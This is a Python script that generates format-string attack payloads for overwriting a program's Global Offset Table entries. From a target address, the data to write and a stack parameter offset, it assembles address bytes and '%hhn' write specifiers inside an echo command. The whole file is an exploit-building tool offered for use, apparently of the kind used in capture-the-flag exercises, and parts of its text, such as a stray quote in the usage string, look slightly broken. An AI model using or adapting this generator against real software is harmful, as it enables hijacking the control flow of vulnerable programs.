import sys

fin_temp = "echo -e '{}'"
write_temp = "%{0}c%{1}$hhn"

if len(sys.argv) != 4:
    print('''
About:   Shellcode generator for GOT overwrite using Format String Attack')
Usage:   python ''' + sys.argv[0] + ''' [ADDR] [DATA_TO_WRITE] [MEM_LOCATION]
Example: python ''' + sys.argv[0] + ' 0x80499e0 0x08048691 6\n''')
    exit(1)

saddr = int(sys.argv[1], 0)
datas = [(i+j) for (i, j) in zip(sys.argv[2][2:][::2], sys.argv[2][2:][1::2])]
datas.reverse()

target_addr = []
total_bytes = 0
addr_code = ''

for data in range(0, len(datas)):
    total_bytes = total_bytes + 4
    target_addr.append(hex(saddr + data))

for addr in target_addr:
    base = '0' + str(addr)[2:]
    tmp = [(i+j) for (i, j) in zip(base[::2], base[1::2])]
    tmp.reverse()
    for part in tmp:
        addr_code = addr_code + '\\x' + part

write_code = ''
param_num = int(sys.argv[3])

for data in datas:
    req_byte = int('0x'+data, 0)
    if req_byte > total_bytes:
        write_code = write_code + write_temp.format(req_byte - total_bytes, str(param_num))
        total_bytes = total_bytes + (req_byte - total_bytes)
        param_num = param_num + 1
    else:
        spare = str(bin(req_byte))[2:]
        if len(spare) != 8:
            while len(spare) != 9:
                spare = '0' + spare
        spare = int('0b1' + spare, 0)
        write_code = write_code + write_temp.format(spare - total_bytes, str(param_num))
        total_bytes = total_bytes + (spare - total_bytes)
        param_num = param_num + 1

print(fin_temp.format(addr_code + write_code))
